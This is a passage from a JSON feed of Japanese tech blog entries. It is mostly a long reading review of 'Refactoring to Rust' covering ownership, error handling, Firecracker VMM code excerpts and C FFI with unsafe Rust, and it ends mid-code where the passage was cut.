Compose対応","link":"https://speakerdeck.com/aminevg/google-cloud-runnodocker-composedui-ying","contentSnippet":"Google Cloud RunがDocker Composeに対応しました！。これで、既存のDockerfileを活用してCloud Runにデプロイできるようになりました。複数のコンテナをまとめて単一サービスとしてデプロイのも便利です。一方で、モノレポへの不向きだったり、複数のサービスをデプロイできなかったり、デメリットもあります。今後はTerraform対応やCompose機能の拡充を期待しています。","isoDate":"2025-08-17T04:00:00.000Z","dateMiliSeconds":1755403200000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"缶つぶし機とソフトウェア移行技術 - Refactoring to Rust の読書感想文","link":"https://syu-m-5151.hatenablog.com/entry/2025/08/14/143527","contentSnippet":"はじめに——あるいは、「知っている」と「理解している」の間Rustのことは、知っていた。学習もしていた。実務でも使っていた。でも、それは知っているつもりだった。知ってるつもり　無知の科学 (ハヤカワ文庫NF)作者:スティーブン スローマン,フィリップ ファーンバック早川書房Amazon日々Rustで開発し、BoxとRcとArcを使い分け、tokio::spawnでタスクを生成し、?演算子を当たり前のように書いている。FFI？PyO3使えばいいでしょ。WebAssembly？wasm-bindgenがあるじゃない。技術的には、確かに「使える」レベルにはあった。でも、心のどこかで感じていた違和感があった。オートバイのエンジンを分解できる人と、エンジンが動く原理を理解している人は違う。コードが動くことと、なぜそう書くべきかを理解することも違う。私は前者だった。メカニックではあったが、エンジニアではなかった。なぜRustはこんなに厳格なのか。なぜ所有権という概念が必要なのか。なぜunsafeをあんなに忌避するのか。これらの「なぜ」に対して、私は技術的な回答はできた。でも、それは表面的な理解に過ぎなかった。部品の名前と用法は知っているが、設計思想は理解していなかった。『Refactoring to Rust』を手に取った理由は、この雰囲気で掴んでいた知識を、哲学として理解したかったから。O\'Reilly Learningでパラパラと眺めた時、これは単なる技術書ではないと直感した。Refactoring to Rust (English Edition)作者:Mara, Lily,Holmes, JoelManningAmazon例えば、「段階的改善」という言葉。実践はしていた。小さく始めて大きく育てる。でも、それがMartin Fowlerの『リファクタリング』から連なる系譜の中にあり、「big bang-style rewrites」への明確なアンチテーゼとして位置づけられていることは知らなかった。リファクタリング(第2版): 既存のコードを安全に改善する (OBJECT TECHNOLOGY SERIES)作者:Martin Fowler 著オーム社Amazon例えば、FFIの境界。PyO3を使えば簡単に境界を越えられる。でも、その境界が「信頼の切れ目」であり、unsafeが「コンパイラが保証できない領域」の明示的な宣言であることの深い意味は、理解していなかった。この読書記録は、一人のRustを実装している人間が、散在していた知識の点を線で結び、線を面にし、そして立体的な理解へと昇華させていく過程の記録である。Kent Beckが「恐怖を退屈に変える」と表現したこと。John Ousterhoutが「深いモジュール」と呼んだもの。これらの古典的な知恵が、Rustという現代の言語でどう具現化されているか。それを理解することで、私の「なんとなく」が「なるほど」に変わっていく。そして、Firecracker VMMやPolarsといった産業グレードのプロジェクトを通じて、教科書的な理想と現実の実装の間にある溝も見えてきた。美術館のアートワーク管理という優雅な例から、(*(*request.request_body).bufs).bufという呪文のような現実へ。この振れ幅こそが、実践の本質だった。さあ、「雰囲気」から「哲学」へ、「使える」から「理解する」への旅を振り返ります。また、気になればぜひ、読んでみてほしいです。あなたにとっても学びが多いハズです。learning.oreilly.comwww.manning.comこのブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。第1章 Why refactor to Rust第1章「Why refactor to Rust」を読んで最初に感じたのは、著者がRustという言語の技術的優位性よりも段階的改善という哲学に重点を置いているということだった。表面的にはパフォーマンスやメモリ安全性という技術的要素を説明しているが、その根底にはソフトウェアシステムの漸進的進化という時代を超えた課題が埋め込まれている。リファクタリングという外科手術本章で著者が「big bang-style rewrites」と呼ぶ完全書き換えへの批判は、Martin Fowlerの「リファクタリング」で語られる原則と深く共鳴する。動いているシステムを止めずに改善する——この一見当たり前のような要求が、どれほど難しく、そして重要なのか。Release It! 本番用ソフトウェア製品の設計とデプロイのために作者:Michael T. Nygardオーム社AmazonFigure 1.1 How refactoring and rewriting affect the size of deployments より引用著者は、リファクタリングとリライトの違いを「手術の規模」になぞらえて説明する。完全書き換えが臓器移植だとすれば、リファクタリングは腹腔鏡手術のようなものだ。小さな切開から始めて、最小限の侵襲で問題を解決する。この比喩は単なる文学的装飾じゃない。リスク管理の本質を突いている。Kent Beckの「Tidy First?」では、コードの整理（tidying）と振る舞いの変更（behavior change）を明確に分離することの重要性が説かれている。Rustへの段階的移行は、まさにこの原則の実践例だと思った。既存のPythonやRubyのコードはそのまま動かしながら、パフォーマンスクリティカルな部分だけをRustで「整理」する。振る舞いは変えずに、実装だけを置き換える。Tidy First? ―個人で実践する経験主義的ソフトウェア設計作者:Kent Beckオーム社Amazonでも、現実はそう単純じゃない。CSVパーサーの寓話本章で示されたCSVパーサーの例——PythonとRustで実装した同じ機能が20倍の性能差を示すという話——は魅力的だけど、同時に危険でもある。Cherry-picked exampleだと著者自身が認めているように、これは最良のケースだ。Science Fictions　あなたが知らない科学の真実作者:スチュアート・リッチーダイヤモンド社Amazonスチュアート・リッチーの「サイエンス・フィクションズ」を読んだ後だと、このような都合の良いベンチマーク結果には警戒心を抱かざるを得ない。科学の世界でさえ、再現性の危機や出版バイアスに悩まされている。技術書のベンチマークも同じ罠に陥りやすい。20倍の性能改善という数字は人を惹きつけるが、それは全体像を表しているだろうか？実際のプロダクションコードでは、PandasやNumPyのような高度に最適化されたC拡張を使っているだろう。純粋なPythonのループと比較するのはフェアじゃない。でも、ここで重要なのは絶対的な性能差じゃなくて、メモリアロケーションの制御という概念だと気づいた。def sum_csv_column(data, column):  sum = 0  for line in data.split(\\"\\\\n\\"):    if len(line) == 0:      continue    value_str = line.split(\\",\\")[column]    sum += int(value_str)  return sumRustの.split()がイテレータを返し、メモリを再利用するという説明は、John Ousterhoutの「A Philosophy of Software Design」で語られる「深いモジュール」の概念を思い出させる。シンプルなインターフェースの裏に、複雑だが強力な実装が隠されている。Rustのゼロコスト抽象化は、まさにこの理想を体現している。fn sum_csv_column(data: &str, column: usize) -> i64 {    let mut sum = 0;    for line in data.lines() {    if line.len() == 0 {      continue;    }    let value_str = line      .split(\\",\\")      .nth(column)      .unwrap();  #3    sum += value_str.parse::<i64>().unwrap();   }  sum}A Philosophy of Software Design, 2nd Edition (English Edition)作者:Ousterhout, John K. ISSVWOAmazon所有権という約束C/C++プログラマーに向けた「メモリ安全性」のセクションを読んで、Rustの所有権システムが単なる技術的な仕組みじゃなくて、プログラマーとコンパイラの間の契約だということを改めて認識した。従来のC/C++では、メモリの所有権は「プログラマーの頭の中」にしか存在しなかった。コメントやドキュメント、命名規則で暗黙的に管理されていた。Rustはこの暗黙知を明示的な型システムに昇華させた。これは単なる安全性の向上じゃない。チーム開発における認知負荷の軽減でもある。でも、Rustの学習曲線は急峻だ。借用チェッカーとの格闘は、多くの開発者にとって最初の——そして時に最後の——障壁となる。著者はこの点について楽観的すぎるかもしれない。型システムの再発見JavaのHashMapの冗長な初期化コードと、Rustの型推論を対比させる部分は巧妙だった。でも、これは半分しか真実を語っていない。確かにRustの型推論は優秀だ。でも、ライフタイムパラメータが絡むと話は変わる。HashMap<&\'a str, Vec<&\'b str>>みたいな型シグネチャは、Java以上に威圧的だ。TypeScriptやKotlinのような現代的な言語と比較すると、Rustの型システムはパワフルだが複雑という評価が妥当だろう。それでも、「テスト駆動開発」のKent Beckが言うように、「恐怖を退屈に変える」ことが重要だ。Rustの型システムは、実行時の恐怖をコンパイル時の退屈な作業に変換する。segfaultの恐怖が、借用チェッカーとの退屈な格闘に変わる。これは良いトレードオフだと思う。FFIという橋第1章の後半で紹介される統合手法——C FFI、言語固有のバインディング、WebAssembly——は、異なる世界をつなぐ橋のようだ。PyO3やwasm-bindgenのような高レベルなバインディングツールの存在は心強い。最近知ったmluaというRust-Luaバインディングも興味深い。Neovimのプラグイン開発でRustを使いたい場合、cargo.nvimを開発したときに使ったのだがmluaを活用してLuaとRustをシームレスに統合している。エディタの拡張機能までRustで書ける時代が来たのだ。これは単なる技術的な遊びじゃなくて、パフォーマンスクリティカルなテキスト処理や、複雑な静的解析をエディタ内で実行する実用的なユースケースがある。でも、FFIの境界では、Rustの安全性保証が部分的に失われることを忘れてはいけない。unsafeブロックは必要悪だが、それでも悪だ。直接呼び出しアーキテクチャFigure 1.3が示す「Rustコードが通常のモジュールのように見える」というアプローチは、認知的な連続性を保つ上で重要だ。開発者から見れば、PythonのモジュールをインポートするのとRustで書かれたモジュールをインポートするのに違いはない。この透明性が、段階的移行を成功させる鍵だ。Figure 1.3 When calling Rust directly from your existing application, your Rust code looks like a normal module.でも、この簡潔さの裏には、メモリの所有権、エラーハンドリング、型変換といった複雑な変換層が隠されている。PyO3が#[pyfunction]マクロで隠蔽する複雑さは、まさに抽象化の芸術だ。開発者は細部を気にせず、ビジネスロジックに集中できる。サービス分離アーキテクチャ一方、Figure 1.4が示すネットワーク経由のアプローチは、マイクロサービスアーキテクチャの文脈で理解すべきだろう。Figure 1.4 When Rust code is in an external service, there is additional overhead due to the network hop. より引用ネットワークホップのオーバーヘッドは確かに存在する。でも、このアプローチには別の利点がある。独立したデプロイメント、言語に依存しないインターフェース、水平スケーリングの容易さ。これはSam Newmanの「マイクロサービスアーキテクチャ」で語られる、強い境界による弱い結合の実現だ。どちらを選ぶかは、トレードオフの問題だ。レイテンシが重要なら前者、運用の独立性が重要なら後者。でも、最初は前者から始めて、状況に応じて後者に移行するという段階的な進化も可能だ。これこそが、本書が提案する実用主義的アプローチの真骨頂だろう。興味深いのは、WebAssemblyという第三の選択肢だ。WASMは単なるブラウザ技術じゃなくて、言語中立的なランタイムとして進化している。WasmerやWasmtimeのようなスタンドアロンランタイムを使えば、Rustで書いたコードをどこでも動かせる。これは「Write Once, Run Anywhere」の新しい形かもしれない。いつ使わないべきか「When not to refactor to Rust」のセクションは、本章で最も価値のある部分かもしれない。技術書が「使わない理由」を真剣に議論することは珍しい。特に「あなたが会社で唯一のRust推進者なら」という警告は重要だ。Bus factor 1のシステムを作ることは、技術的負債の別の形だ。Goが成功した理由の一つは、学習曲線が緩やかで、チーム全体が習得しやすかったことだ。Rustはこの点で不利だ。組織的な準備なしにRustを導入することは、「Tidy First?」でKent Beckが警告する「整理のための整理」に陥る危険がある。技術的に優れた解決策が、必ずしもビジネス的に正しい選択とは限らない。Rustという選択の合理性著者は「empowering」「welcoming」「reliable」「efficient」というRustの特徴を挙げている。でも、これらは他の言語でも主張されている。本当の差別化要因は何か？私は、Rustの価値はゼロコスト抽象化とメモリ安全性の両立にあると思う。C++は前者を、Goは後者を提供する。両方を同時に提供するのはRustだけだ（Zigも近いが、まだ成熟していない）。Discordが最近発表したように、彼らはGoからRustに移行することで、レイテンシのスパイクを劇的に削減した。これはGCの存在が根本原因だった。リアルタイム性が求められるシステムでは、予測可能なパフォーマンスが重要だ。Rustはこれを保証する。実用主義者のためのRust第1章を読んで、この本が提案しているのは実用主義的なRust導入戦略だとわかった。完璧主義者のための完全書き換えじゃなくて、現実主義者のための段階的改善。Martin Fowlerが「リファクタリング」で述べたように、「プログラムを動かし続けながら、設計を改善する」ことが重要だ。Rustへの移行も同じ原則に従うべきだ。測定し、最も痛みを感じる部分を特定し、外科手術的に改善する。でも、忘れてはいけない。技術は手段であって目的じゃない。Rustが解決するのは技術的な問題だけだ。組織的な問題、プロセスの問題、人の問題は残る。それでも、適切に使われたRustは、システムの進化を可能にする強力なツールだ。恐怖を退屈に変え、不確実性を型システムに閉じ込め、並行性を安全にする。これらは小さな改善じゃない。ソフトウェアの品質に対する根本的な再考だ。次の章では、具体的な測定と分析の手法が語られるだろう。楽しみだ。なぜなら、「測定できないものは改善できない」からだ。でも、測定だけでは不十分だ。行動が必要だ。そして、その行動の一つが、Rustへの段階的な移行かもしれない。ただし、銀の弾丸はない。Fred Brooksが50年前に警告したように。Rustも例外じゃない。でも、適切に使えば、強力な道具になる。問題は、いつ、どこで、どのように使うかだ。この本は、その問いに答えようとしている。理想的な答えじゃないかもしれない。でも、始まりとしては十分だ。第2章 An overview of Rust第2章「An overview of Rust」を読んで最初に感じたのは、著者が所有権や借用という技術的メカニズムよりもメモリ管理の責任の所在に重点を置いているということだった。表面的にはRustの基本的な言語機能を説明しているが、その根底にはプログラマーとコンパイラの契約関係の再定義という時代を超えた課題が埋め込まれている。美術館のメタファーが語るもの著者が選んだ美術館のアートワーク管理システムという例は、単なる教育的な配慮じゃない。これは所有と共有のパラドックスを表現する巧妙な選択だ。美術作品は一つしか存在しないが、多くの人に鑑賞されなければならない。この物理世界の制約が、そのままRustのメモリモデルに投影されている。fn admire_art(art: Artwork) {  println!(\\"Wow, {} really makes you think.\\", art.name);}このコードが最初のコンパイルエラーを生むとき、初学者は戸惑うだろう。なぜ同じ作品を二度鑑賞できないのか？ でも、これこそがRustの本質だ。所有権の移動（move）は、責任の移譲を意味する。美術館から作品が消えてしまうのだ。John Ousterhoutの「A Philosophy of Software Design」では、複雑性を制御する方法として「深いモジュール」の概念が提唱されている。シンプルなインターフェースの裏に複雑な実装を隠すという考え方だ。でも、Rustの所有権システムは逆のアプローチを取る。複雑性を型システムに露出させることで、実行時の複雑性を排除する。この選択は、トレードオフだ。学習コストと引き換えに、実行時の安全性を得る。でも、本当にこれは「複雑性の露出」なのだろうか？ むしろ、本質的な複雑性の顕在化かもしれない。メモリ管理は元々複雑だ。C/C++はそれを隠していただけで、Rustは正直に見せている。ライフタイムグラフという可視化本章で導入されるライフタイムグラフは、革新的な教育ツールだと思った。Figure 2.5 The lifetime graph for listing 2.9 より引用このグラフが示すのは、単なる変数の生存期間じゃない。責任の流れだ。誰が、いつ、何に対して責任を持つのか。これはDomain-Driven Designにおける集約（Aggregate）の境界定義に似ている。データの一貫性を保証するために、明確な境界と責任者が必要だ。Eric Evansは集約のルートを通じてのみ内部オブジェクトにアクセスすることを推奨している。Rustの所有権も同じだ。所有者を通じてのみ、値にアクセスできる。借用は一時的なアクセス権で、集約の境界を越えた参照に似ている。でも、現実のプロジェクトでこのような可視化ツールはあるだろうか？ rust-analyzerやIntelliJ Rustプラグインは、借用チェッカーのエラーを表示してくれるが、ライフタイムの全体像を俯瞰することは難しい。aquascopeやrustowlというツールが登場しているので今後も注目していきたい。「K言語」という思考実験の深層著者が導入する架空の「K言語」——Pythonに手動メモリ管理を追加した言語——は秀逸な思考実験だ。def welcome(name):  print(\'Welcome \' + name)  free(name)  # 誰がこの責任を持つべきか？この例は、C/C++プログラマーが日常的に直面するジレンマを見事に表現している。関数の暗黙的な副作用。welcome関数が引数を解放するという「隠れた契約」は、ドキュメントにしか存在しない。これは、リスコフの置換原則の違反でもある。関数のシグネチャが同じでも、メモリ管理の挙動が異なれば、安全に置換できない。C++のスマートポインタ（unique_ptr、shared_ptr）は、この問題を部分的に解決するが、Rustほど厳密じゃない。void process(std::unique_ptr<Data> data) {    // dataの所有権を取得}void observe(const Data& data) {    // dataを借用するだけ}C++でもある程度は表現できるが、コンパイラの強制力が弱い。Rustはすべての参照にライフタイムがあることを明示的に管理する。文字列型の二重性が示すものStringと&strの区別は、多くの初学者を悩ませる。でも、これは所有と借用の具現化だ。let mut x = String::with_capacity(10_000_000);  // 事前割り当てfor _ in 0..10_000_000 {    x.push(\'.\');}著者が示す1000万個のドットを追加する例は、パフォーマンスの観点から興味深い。Pythonでは同じ操作に約10億回のアロケーションが発生する可能性があるが、Rustでは1回で済む。でも、より深い洞察は制御の粒度にある。JavaやC#のStringBuilderも似たような最適化を提供するが、Rustは言語レベルでこれを統合している。Stringは単なるデータ構造じゃない。所有権の具現化だ。実際、ripgrepのようなツールがなぜ高速なのか、この章を読むと理解できる。不要なアロケーションを避け、必要な時だけメモリを確保する。grepの何倍も高速な理由は、単にRustで書かれているからじゃない。メモリ管理を細かく制御できるからだ。エラーを値として扱う哲学の深層FizzBuzzを使ったエラーハンドリングの説明は、一見すると過剰に思える。でも、これはエラーの第一級市民化という重要な概念を示している。enum Result<T, E> {    Ok(T),    Err(E),}この定義は、HaskellのEither型に似ている。実際、Resultはモナドの一種だ。map、and_then（Haskellのbindに相当）などのメソッドを持つ。fn validate_username(username: &str) -> Result<(), UsernameError> {  validate_lowercase(username)    .map_err(|_| UsernameError::NotLowercase)?;  validate_unique(username)    .map_err(|_| UsernameError::NotUnique)?;  Ok(())}このmap_errの連鎖は、Railway Oriented Programmingを思い出させる。成功の軌道と失敗の軌道を並行して走らせ、エラーが発生したら失敗の軌道に切り替える。でも、現実のコードベースではunwrap()の乱用を見かける。GitHubで「unwrap()」を検索すると、多くのRustプロジェクトでヒットする。特にテストコードでは顕著だ。anyhowやthiserrorのようなエラーハンドリングライブラリの人気は、標準のResult型だけでは不十分なことを示している。?演算子の美学と限界let result = fizzbuzz(i)?;この小さな?記号は、エラー処理の明示的な委譲を表現する。でも、これには限界もある。Goでは、エラー処理は冗長だが明確だ。以下のようなコードになる。result, err := fizzbuzz(i)if err != nil {    return err}Rustの?は簡潔だが、エラーの変換が暗黙的になりやすい。特に、Fromトレイトを使った自動変換は、デバッグを困難にすることがある。Firecracker VMMから学ぶAWSのFirecracker VMMの実際のコードを見ると、本章で学んだ概念が産業グレードのシステムでどう実装されているかが明確になる。/// Contains the state and associated methods required for the Firecracker VMM.#[derive(Debug)]pub struct Vmm {    events_observer: Option<std::io::Stdin>,    pub instance_info: InstanceInfo,    shutdown_exit_code: Option<FcExitCode>,        // Guest VM core resources.    kvm: Kvm,    pub vm: Arc<Vm>,  // 共有所有権の明示    vcpus_handles: Vec<VcpuHandle>,    vcpus_exit_evt: EventFd,    device_manager: DeviceManager,}このコード構造から、所有権の階層的な設計が見て取れる。Vmmが全体を所有し、Arc<Vm>で仮想マシンを複数のVCPUスレッドと共有している。これは美術館で言えば、一つの作品（VM）を複数の学芸員（VCPU）が同時に管理するようなものだ。エラーハンドリングの徹底Firecrackerのエラー型定義は圧巻だ。次のような構造になっている。#[derive(Debug, thiserror::Error, displaydoc::Display)]pub enum VmmError {    /// Device manager error: {0}    DeviceManager(#[from] device_manager::DeviceManagerCreateError),    /// Cannot send event to vCPU. {0}    VcpuEvent(vstate::vcpu::VcpuError),    /// Failed to pause the vCPUs.    VcpuPause,    // ... 他にも20以上のエラーバリアント}thiserrorとdisplaydocを使った構造化されたエラー処理。これは本章で学んだResult型の産業的な実装だ。各エラーは具体的な状況に応じた文脈を持ち、#[from]属性で自動変換も定義されている。メッセージパッシングによるVCPU制御pub fn pause_vm(&mut self) -> Result<(), VmmError> {    // Send the events.    self.vcpus_handles        .iter()        .try_for_each(|handle| handle.send_event(VcpuEvent::Pause))        .map_err(|_| VmmError::VcpuMessage)?;    // Check the responses with timeout.    if self.vcpus_handles        .iter()        .map(|handle| handle.response_receiver().recv_timeout(RECV_TIMEOUT_SEC))        .any(|response| !matches!(response, Ok(VcpuResponse::Paused)))    {        return Err(VmmError::VcpuMessage);    }        self.instance_info.state = VmState::Paused;    Ok(())}このコードは防御的プログラミングの極致だ。30秒のタイムアウト（RECV_TIMEOUT_SEC）を設定し、すべてのVCPUからの応答を確認している。一つでも異常があれば即座にエラーを返す。Dropトレイトによる資源管理impl Drop for Vmm {    fn drop(&mut self) {        // グレースフルシャットダウンの保証        self.stop(self.shutdown_exit_code.unwrap_or(FcExitCode::Ok));                if let Some(observer) = self.events_observer.as_mut() {            // ターミナルをカノニカルモードに戻す            let res = observer.lock().set_canon_mode().inspect_err(|&err| {                warn!(\\"Cannot set canonical mode for the terminal. {:?}\\", err);            });        }                // メトリクスの書き出し        if let Err(err) = METRICS.write() {            error!(\\"Failed to write metrics while stopping: {}\\", err);        }                // VCPUスレッドの終了確認        if !self.vcpus_handles.is_empty() {            error!(\\"Failed to tear down Vmm: the vcpu threads have not finished execution.\\");        }    }}このDropの実装は、RAIIパターンの教科書的な例だ。リソースの解放だけでなく、システムの一貫性も保証している。特に、VCPUスレッドが残っていないことを確認する最後のチェックは重要だ。unsafeの最小化コードの冒頭にある警告が印象的だ。次のようなものだ。#![warn(clippy::undocumented_unsafe_blocks)]これは、すべてのunsafeブロックにドキュメントを要求する。実際、500行を超えるこのファイルにunsafeは一度も登場しない。KVMとの相互作用は抽象化層で隠蔽され、安全性の境界が明確に定義されている。Firecrackerでは、panic!は最小限に抑えられている。ゲストVMの異常でホストが落ちるわけにはいかない。すべてのエラーは回復可能として扱われる。美術館から工場へ、そして戦場へ美術館のメタファーは教育的だが、現実のシステムは工場であり、時に戦場だ。tokioのような非同期ランタイムでは、所有権の管理はさらに複雑になる。次のようなパターンが必要になる。use std::sync::Arc;use tokio::sync::Mutex;let data = Arc::new(Mutex::new(vec![1, 2, 3]));let data_clone = Arc::clone(&data);tokio::spawn(async move {    let mut lock = data_clone.lock().await;    lock.push(4);});Arc<Mutex<T>>パターンは、共有所有権を表現する。これは美術館で言えば、複数の美術館が一つの作品を共同所有するようなものだ。誰も単独で破壊できないが、誰もが鑑賞できる。でも、このパターンには罠もある。デッドロックの可能性だ。Rustはデータ競合は防げるが、デッドロックは防げない。部分的な正しさの例だ。パニックという最終手段の哲学panic!(\\"Got a negative number for fizzbuzz: {}\\", x);panic!の導入は、Rustの実用主義を示している。でも、これはErlangの「Let it crash」哲学とは根本的に異なる。Erlangでは、プロセスの失敗は想定内だ。次のようなコードが一般的だ。spawn_link(fun() ->    % クラッシュしても親プロセスが処理    risky_operation()end).Rustでは、パニックは想定外だ。Actix Webのようなフレームワークは、アクターモデルを使ってErlang的な耐障害性を実現しようとしているが、言語レベルのサポートはない。実際、Cloudflareのようなエッジコンピューティング環境では、パニックは許されない。一つのリクエストの失敗で、ワーカー全体が落ちるわけにはいかない。だから、徹底的なResultの使用が求められる。doc.rust-jp.rsqiita.comムーブセマンティクスの深い意味fn admire_art(art: Artwork) {    // artの所有権を取得}let art1 = Artwork { name: \\"La Libert\xe9 guidant le peuple\\".to_string() };admire_art(art1);// art1はもう使えないこの「使えなくなる」という制約は、最初は不便に感じる。でも、これはリソース管理のRAII（Resource Acquisition Is Initialization）パターンの究極形だ。C++でも似たような概念がある。以下のようなコードだ。std::unique_ptr<Artwork> art1 = std::make_unique<Artwork>();admire_art(std::move(art1));// art1は空になるでも、C++のstd::moveはヒントに過ぎない。コンパイラは強制しない。Rustのムーブは保証だ。契約の明文化から信頼の構築へ第2章を読み終えて、そして実際のFirecracker VMMのコードを見て、Rustが提案しているのは単なる暗黙を明示に変えることじゃないとわかった。それは信頼できるソフトウェアの構築方法だ。教育的な美術館から産業的な仮想化基盤へ本章の美術館の例とFirecrackerのコードを比較すると、興味深い世界が見える。教育的な例：fn admire_art(art: &Artwork) {    println!(\\"Wow, {} really makes you think.\\", art.name);}産業的な実装：pub fn save_state(&mut self, vm_info: &VmInfo) -> Result<MicrovmState, MicrovmStateError> {    let vcpu_states = self.save_vcpu_states()?;    let kvm_state = self.kvm.save_state();    let vm_state = self.vm.save_state().map_err(SaveVmState)?;    let device_states = self.device_manager.save();        Ok(MicrovmState {        vm_info: vm_info.clone(),        kvm_state,        vm_state,        vcpu_states,        device_states,    })}美術館の作品を「鑑賞する」シンプルな関数から、仮想マシン全体の状態を「保存する」複雑な関数へ。でも、根底にある原則は同じだ。所有権の明確化、エラーの明示的な処理、借用による処理速度が速いアクセス。段階的な信頼の構築Firecrackerのシャットダウンシーケンスは、分散システムにおける合意形成プロトコルを思わせる：// Firecrackerのコメントより// 1. vcpu.exit(exit_code)// 2. vcpu.exit_evt.write(1)// 3. <--- EventFd::exit_evt ---// 4. vmm.stop()// 5. --- VcpuEvent::Finish ---\x3e// 6. StateMachine::finish()// 7. VcpuHandle::join()// 8. vmm.shutdown_exit_code becomes Some(exit_code)これは単なる終了処理じゃない。分散合意だ。各VCPUが独立したアクターとして動作し、メッセージパッシングで状態を同期する。ErlangやAkkaを彷彿とさせるが、Rustの型システムがより強い保証を提供している。パニックしない哲学Firecrackerのコードで最も印象的なのは、panic!の不在だ。本章ではpanic!を「最終手段」として紹介していたが、Firecrackerはそれすら使わない。/// Timeout used in recv_timeout, when waiting for a vcpu responsepub const RECV_TIMEOUT_SEC: Duration = Duration::from_secs(30);30秒という長いタイムアウト。これは楽観的ロックの逆だ。悲観的だが確実なアプローチ。VCPUがデッドロックしていることを検出するための保険だ。メトリクスという観測可能性// Write the metrics before exiting.if let Err(err) = METRICS.write() {    error!(\\"Failed to write metrics while stopping: {}\\", err);}エラーが起きても、メトリクスの書き出しを試みる。これは観測可能性（Observability）への配慮だ。システムが失敗しても、なぜ失敗したかを知る手がかりを残す。「Refactoring to Rust」の意味この章とFirecrackerのコードを照らし合わせると、「Refactoring to Rust」の意味が見えてくる。それは単に：PythonをRustに書き換えることじゃないパフォーマンスを改善することじゃないメモリ安全性を得ることじゃないそれは：システムの契約を明文化することエラーを第一級市民として扱うこと所有権を通じて責任を明確化すること型システムで不変条件を保証することFirecrackerは、これらの原則を1ミリ秒のレイテンシと5MBのメモリフットプリントで実現している。これは理論の実践的な証明だ。第3章 Introduction to C FFI and unsafe Rust第3章「Introduction to C FFI and unsafe Rust」を読んで最初に感じたのは、著者がFFIという技術的な仕組みよりも異なる世界の架け橋を築く哲学に重点を置いているということだった。表面的にはunsafeブロックやポインタ操作を説明しているが、その根底には信頼境界の管理という時代を超えた課題が埋め込まれている。unsafeという名の正直さ「unsafe」という言葉は誤解を招きやすい。著者も指摘するように、これは「危険」ではなく「未検証」を意味する。より正確には「コンパイラが保証できない領域」だ。unsafe {    *solution = 1024;}このたった2行のコードが、Rustの哲学の核心を表している。通常のRustコードでは、コンパイラがメモリ安全性を保証する。でも、C言語の世界から渡されたポインタについて、コンパイラは何も知らない。信頼の連鎖が切れる場所、それがunsafeブロックだ。John Ousterhoutの「A Philosophy of Software Design」では、モジュール間の境界を明確にすることの重要性が説かれている。unsafeブロックは、まさにその境界を可視化する。「ここから先は、私（プログラマー）が責任を持つ」という宣言だ。Figure 3.1 A program’s stack memory during reference and dereference operations より引用この図が示すように、ポインタは単なるメモリアドレス——インデックスのようなものだ。でも、そのシンプルさゆえに危険でもある。doc.rust-lang.orgRPN計算機という教材の巧妙さ著者が選んだ逆ポーランド記法（RPN）計算機という例は、教育的配慮以上の意味を持つ。RPNはスタックマシンの純粋な表現だ。Infix: (3 + 4) * 12RPN  : 3 4 + 12 *     = 84Figure 3.2 RPN stack used to calculate 3 4 + 12 * より引用この例が巧妙なのは、複雑性が段階的に導入される点だ。最初は単純な二項演算、次に複数の演算の連鎖。Kent Beckの「Tidy First?」で語られる「小さな整理から始める」原則の実践例だ。でも、現実のプロジェクトはRPN計算機のようにシンプルじゃない。cbindgenのようなツールが人気なのは、手動でFFIバインディングを書くことの複雑さを物語っている。github.comメモリ共有という芸術本章で最も印象的だったのは、CとRustが同じメモリを共有している様子だ。fn evaluate(problem: &str) -> Result<i32, Error> {  println!(\\"problem: {:p}\\", problem.as_ptr());  // ...}実行結果：problem: 0x7ffc117917b0  # Cのスタックアドレスterm   : 0x7ffc117917b0  # 同じアドレス！文字列が再アロケーションされることなく、Cのスタックメモリを直接参照している。これはゼロコピーの美しい実例だ。でも、この効率性には代償がある。CStr::from_ptrはunsafeだ。なぜなら、Cから渡されたポインタが：- 有効なメモリを指しているか- NULL終端されているか- UTF-8として有効かこれらをコンパイラは検証できない。プログラマーが保証しなければならない。libcという薄い抽象use libc::{c_char, c_int};libcクレートは、CとRustの型システムの違いを吸収する。C言語のintのサイズはプラットフォーム依存だが、c_intはそれを抽象化する。これは適応層パターンの実例だ。異なるインターフェースを持つシステムを接続するための薄い変換層。でも、薄すぎると危険で、厚すぎると非効率。具体的な状況に応じたバランスが重要だ。実際、PyO3のようなプロジェクトは、より高レベルな抽象を提供する：#[pyfunction]fn sum_as_string(a: usize, b: usize) -> PyResult<String> {    Ok((a + b).to_string())}PyO3では、unsafeを一切書かずにPythonとやり取りできる。でも、その裏では本章で学んだような低レベルのFFIが動いている。github.com動的ライブラリという柔軟性[lib]crate-type = [\\"cdylib\\"]この設定により、RustコードがC互換の動的ライブラリになる。$ cargo build$ gcc calculator.c -o bin -lcalculate動的リンクの利点は明確だ：- Rustコードの再コンパイル後、Cプログラムの再コンパイルが不要- メモリ効率（複数のプロセスで共有可能）- 独立したデプロイメントでも、動的ライブラリにはDLL地獄の問題もある。バージョン管理、依存関係の解決、ABI互換性——これらすべてが複雑になる。Displayトレイトという共通言語impl Display for Error {  fn fmt(&self, f: &mut Formatter) -> std::fmt::Result {    match self {      Error::InvalidNumber => write!(f, \\"Not a valid number or operator\\"),      Error::PopFromEmptyStack => write!(f, \\"Tried to operate on empty stack\\"),    }  }}Displayトレイトの実装は、エラーメッセージの中央集権化だ。これはDomain-Driven Designのユビキタス言語の概念に通じる。エラーの意味を一箇所で定義し、どこでも同じメッセージを使う。Martin Fowlerの「リファクタリング」では、「重複の排除」が基本原則の一つだ。Displayトレイトは、エラーメッセージの重複を防ぐエレガントな方法だ。段階的移行の現実本章のRPN計算機の例は、段階的移行の理想形を示している。境界の明確化：solve関数だけを移行インターフェースの保持：同じシグネチャを維持責任の分離：FFI層（solve）とビジネスロジック（evaluate）を分離でも、現実はもっと複雑だ。実際のプロジェクトでの課題Firecracker VMMのようなプロジェクトでは、数千のFFI呼び出しがある。各呼び出しで：- エラー処理の変換- 所有権の移譲- ライフタイムの管理これらを正しく行う必要がある。一つでも間違えれば、セグメンテーションフォルトだ。github.comripgrepの作者Andrew Gallantは、「RustのFFIは強力だが、慎重に使うべき」と述べている。彼のプロジェクトでは、FFI境界を最小限に抑え、可能な限りRust側で処理を完結させている。github.comburntsushi.netunsafeの連鎖という罠let c_str = unsafe { CStr::from_ptr(line) };let r_str = match c_str.to_str() {    Ok(s) => s,    Err(e) => {        eprintln!(\\"UTF-8 Error: {}\\", e);        return 1;    